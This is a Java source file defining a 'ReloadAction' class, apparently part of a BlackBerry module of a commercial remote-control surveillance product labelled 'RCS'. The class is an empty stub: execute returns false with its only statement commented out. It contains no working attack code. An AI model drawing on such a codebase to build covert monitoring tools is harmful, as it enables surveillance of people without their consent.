//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ReloadAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import blackberry.Trigger;
import blackberry.config.ConfAction;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;


/**
 * The Class ReloadAction.
 */
public final class ReloadAction extends SubAction {
    //#ifdef DEBUG
    static Debug debug = new Debug("ReloadAction", DebugLevel.VERBOSE);
    //#endif
    /**
     * Instantiates a new reload action.
     * 
     * @param params
     *            the conf params
     */
    public ReloadAction(final ConfAction params) {
        super(params);
    }

    /*
     * (non-Javadoc)
     * 
     * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
     */

    public boolean execute(Trigger trigger) {
        //status.reload=true;
        return false;
    }


    protected boolean parse(ConfAction params) {
        return true;
    }

    //#ifdef DEBUG
    public String toString() {
        return "Reload";
    }
    //#endif
}
